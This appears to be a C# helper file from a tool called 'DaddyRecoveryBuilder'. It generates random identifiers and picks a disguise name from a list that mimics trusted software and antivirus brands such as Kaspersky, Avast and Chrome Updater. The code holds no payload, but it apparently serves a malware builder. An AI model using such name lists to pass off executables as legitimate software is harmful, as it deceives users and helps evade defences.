namespace DaddyRecoveryBuilder.Helpers
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Security.Cryptography;

    public static class GenTools
    {
        public static void Shuffle<T>(this IList<T> list)
        {
            using var provider = new RNGCryptoServiceProvider();
            int n = list.Count;
            while (n > 1)
            {
                byte[] box = new byte[1];
                do provider.GetBytes(box);
                while (!(box[0] < n * (byte.MaxValue / n)));
                int k = box[0] % n;
                n--;
                T value = list[k];
                list[k] = list[n];
                list[n] = value;
            }
        }
        private static readonly char[] AvailableCharacters = Enumerable.Range('A', 26).Select(x => (char)x)?.ToArray();
        // private static readonly char[] AvailableCharacters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray();
        private static readonly List<string> SpisokName = new List<string>
        {
           "Windows", "Microsoft", "ZoooFMega", "Boom", "Origin", "Unpacker", "Protector",
           "Utility", "Launcher", "CheatEngine", "ExtraToolS", "EsetKey", "Mega", "Gold",
           "Kaspersky", "Avast","UnionTech", "SpaceCloud", "ApoloCong", "BalTech", "Updater",
           "Paragon", "NeoSpy", "Sysinternals Procmon", "Loader", "Chat_Update", "NetToolS",
           "Software", "Prototype", "Downloader", "Soft", "Firefox", "Chrome Updater", "Opera",
           "AntiVM", "Antivirus", "Anti-Malware", "Free", "PCDoctor", "Launchy", "7-Zip", "WinRar",
           "HotKey", "Tunner", "Steam", "PointBlank", "Thief"
        };
        public static string GetUpdate()
        {
            SpisokName?.Shuffle();
            return SpisokName[0];
        }
        public static string GenerateIdentifier(int length)
        {
            char[] identifier = new char[length];
            byte[] randomData = new byte[length];

            using var rng = new RNGCryptoServiceProvider(); rng.GetBytes(randomData);

            for (int idx = 0; idx < identifier.Length; idx++)
            {
                identifier[idx] = AvailableCharacters[randomData[idx] % AvailableCharacters.Length];
            }
            return new string(identifier);
        }
        public static int Next(int max)
        {
            byte[] bytes = new byte[4];
            int sse = 0;
            try
            {
                using var rng = new RNGCryptoServiceProvider();
                rng.GetBytes(bytes);
                sse = int.MaxValue & BitConverter.ToInt32(bytes, 0);
                return sse % max;
            }
            catch { return sse; }
        }
    }
}